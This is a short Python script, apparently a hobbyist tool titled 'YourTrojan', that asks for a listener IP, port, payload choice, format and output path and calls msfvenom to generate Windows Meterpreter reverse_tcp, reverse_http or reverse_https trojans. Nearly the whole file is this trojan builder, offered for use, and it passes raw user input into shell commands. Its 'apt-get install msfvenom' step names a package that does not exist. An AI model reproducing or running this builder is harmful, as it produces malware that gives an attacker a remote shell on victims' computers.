 #!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

os.system("sudo apt-get install figlet")
os.system("sudo apt-get install msfvenom")
os.system("clear")
os.system("figlet YourTrojan - BerkLinux")
print("""
Create your own Trojan.""")

ip = raw_input("IP for the target: ")
port = raw_input("Port number: ")
print("""
Payload List:

1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/reverse_http
3) windows/meterpreter/reverse_https
""")
payload = raw_input("Payload number: ")
formatt = raw_input("Payload format: ")
savelocation = raw_input("Saving location: ")

if payload == '1':
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f" + formatt + " -o" + savelocation)
	
elif payload == '2':
	os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f" + formatt + " -o" + savelocation)

elif payload == '3':
	os.system("msfvenom -p windows/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f" + formatt + " -o" + savelocation)
	
else:
	print('An error occurred. Please try again.')
	
